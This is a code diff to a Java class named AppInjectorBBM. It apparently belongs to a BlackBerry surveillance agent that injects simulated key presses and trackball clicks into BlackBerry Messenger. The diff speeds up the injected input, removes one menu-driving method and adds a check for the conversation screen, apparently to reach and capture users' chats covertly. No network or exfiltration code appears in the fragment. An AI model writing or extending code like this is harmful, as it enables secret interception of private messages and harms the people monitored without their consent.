@@ -2,7 +2,6 @@ package blackberry.agent.im;
 
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
-import net.rim.device.api.ui.UiApplication;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.AppInjectorInterface;
@@ -67,9 +66,9 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
             debug.trace("callMenuByKey press raw key");
             //#endif
             KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-            Utils.sleep(500);
+            Utils.sleep(100);
             KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
-            Utils.sleep(500);
+            Utils.sleep(100);
             KeyInjector.trackBallRawClick();
             //KeyInjector.trackBallClick();
         }else{
@@ -87,34 +86,6 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
     }
 
 
-
-    public boolean menuRun() {
-        //#ifdef DEBUG
-        debug.trace("menuRun");
-        //#endif
-        
-        menu.addMenuBBM();
-
-        Utils.sleep(100);
-        KeyInjector.pressKeyCode(Keypad.KEY_MENU);
-        Utils.sleep(100);
-
-        debug.trace("  messenger active screen: "
-                + UiApplication.getUiApplication().getActiveScreen().getClass()
-                        .getName());
-
-        KeyInjector.pressRawKey('y');
-
-        Utils.sleep(100);
-        debug.info("pressing menu y");
-        KeyInjector.trackBallClick();
-
-        Utils.sleep(100);
-        menu.removeMenuBBM();
-
-        return false;
-    }
-
     public String getAppName() {
 
         return "Messenger";
@@ -122,6 +93,10 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
 
 
     public void callMenuInContext() {
+        //#ifdef DEBUG
+        debug.trace("callMenuInContext");
+        //#endif
+        BBMMenuItem.getInstance().checkForConversationScreen();
         
     }
     
